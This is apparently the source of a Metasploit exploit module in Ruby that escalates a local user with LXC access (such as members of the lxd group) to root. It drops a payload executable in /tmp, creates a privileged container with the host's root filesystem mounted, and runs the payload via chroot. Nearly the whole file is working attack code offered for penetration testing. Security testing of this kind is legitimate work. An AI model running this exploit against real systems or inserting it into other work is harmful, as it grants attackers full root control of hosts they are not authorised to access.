##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# Module based on docker_daemon_privilege_escalation but modified to exploit LXC
# This exploit is based on
# Note: bind shells probably wont work due to the container port not being mapped to the host.
class MetasploitModule < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        {
          'Name' => 'LXC Privilege Escalation',
          'Description' => %q{
            This module obtains root privileges from any host account with access to LXC. This typically includes any users in the `lxd` group.
          },
          'License' => MSF_LICENSE,
          'Author' => ['stealthcopter'],
          'Platform' => 'linux',
          'Arch' => [ARCH_X86, ARCH_X64, ARCH_ARMLE, ARCH_MIPSLE, ARCH_MIPSBE],
          'Targets' => [['Automatic', {}]],
          'DefaultOptions' => { 'PrependFork' => true, 'WfsDelay' => 5 },
          'SessionTypes' => ['shell', 'meterpreter'],
          'DefaultTarget' => 0,
          'References' => [
            ['EDB', '46978'],
            ['URL', 'https://reboare.github.io/lxd/lxd-escape.html'],
            ['URL', 'https://github.com/lxc/lxd/issues/2003']
          ],
          'DisclosureDate' => 'May 7 2016' # Earliest mention I could find of this exploit in the LXC github referenced above
        }
      )
    )
    register_options([
      OptString.new('BaseImage', [false, 'The base image used to create the container, if not set the first image found will be used', ''])
    ])
    register_advanced_options([
      OptBool.new('ForceExploit', [false, 'Override check result', false]),
      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp']),
    ])
  end

  def base_dir
    datastore['WritableDir'].to_s
  end

  # Get the base image used to create the container
  def base_image
    if datastore['BaseImage'].blank?
      # Select the first image we find, the only requirement is that we can run chroot inside of it, so any container should suffice
      cmd_exec('lxc image list -c f --format csv| head -n1').strip
    else
      datastore['BaseImage'].to_s
    end
  end

  # Check we have all the prerequisites to perform the priv esc
  def check
    # Check if we can execute lxc list
    unless cmd_exec('lxc list && echo true') =~ /true$/
      return Exploit::CheckCode::Safe('LXC is not accessible by current user.')
    end

    # Check if there is a locally available image we can use, we need at least one image so we can create a container
    local_images = cmd_exec('lxc image list -c fd --format csv')
    local_image_count = local_images.each_line.size
    vprint_status("Found #{local_image_count} local images:\n" + local_images)

    if local_image_count == 0
      # No local images found, suggest one is downloaded
      return CheckCode::Appears('There are no local images we can use, please download an image such as alpine or ubuntu.')
    end

    # Check if python exists as it's required for the exploit to function
    unless command_exists?('python')
      return CheckCode::Appears('This exploit requires python, but the python binary was not found')
    end

    Exploit::CheckCode::Vulnerable('LXC is accessible, and there is at least one local image we can use to create a container')
  end

  # Execute an LXC command and return true if successful
  def execute(cmd)
    vprint_status(cmd)
    result = cmd_exec(cmd)
    vprint_status(result)
    !result.include?('Error: ')
  end

  def exploit
    unless check == CheckCode::Vulnerable
      unless datastore['ForceExploit']
        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
      end
      print_warning 'Target does not appear to be vulnerable'
    end

    if is_root?
      unless datastore['ForceExploit']
        fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.'
      end
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    unless base_image
      fail_with Failure::NoTarget, 'Could not find a base image to use'
    end

    print_status("Using base image #{base_image}")

    pl = generate_payload_exe
    exe_path = "#{base_dir}/#{rand_text_alpha(6..11)}"
    print_status("Writing payload executable to '#{exe_path}'")

    write_file(exe_path, pl)
    register_file_for_cleanup(exe_path)

    # Generate a random name for the container and device
    container_name = rand_text_alpha(6..11)
    device_name = rand_text_alpha(6..11)

    # Reminder to delete container after exploitation
    print_warning("Creating container named #{container_name}, remember to delete this after exploitation")
    print_warning("Using: lxc stop #{container_name} && lxc delete #{container_name}")

    print_status('Executing script to create and run LXC container')
    vprint_status(cmd_exec("chmod +x #{exe_path}"))

    # Using the python pty trick here as the `lxc init` command doesn't work in a non-interactive shell.
    print_status('Creating container')
    unless execute("echo 'lxc init #{base_image} #{container_name} -c security.privileged=true;exit' | python -c 'import pty;pty.spawn(\"/bin/sh\")'")
      fail_with Failure::UnexpectedReply, "Error creating container, check #{base_image} is avaliable"
    end

    print_status('Adding mount to container')
    unless execute("lxc config device add #{container_name} #{device_name} disk source=/ path=/mnt/root recursive=true")
      fail_with Failure::UnexpectedReply, 'Error mounting root partition in container'
    end

    print_status('Starting container')
    unless execute("lxc start #{container_name}")
      fail_with Failure::UnexpectedReply, 'Error starting container'
    end

    print_status('Executing payload inside container')
    unless execute("lxc exec #{container_name} chroot /mnt/root #{exe_path}")
      fail_with Failure::UnexpectedReply, 'Error executing payload inside container'
    end

    print_status "Waiting #{datastore['WfsDelay']}s for payload"
  end
end
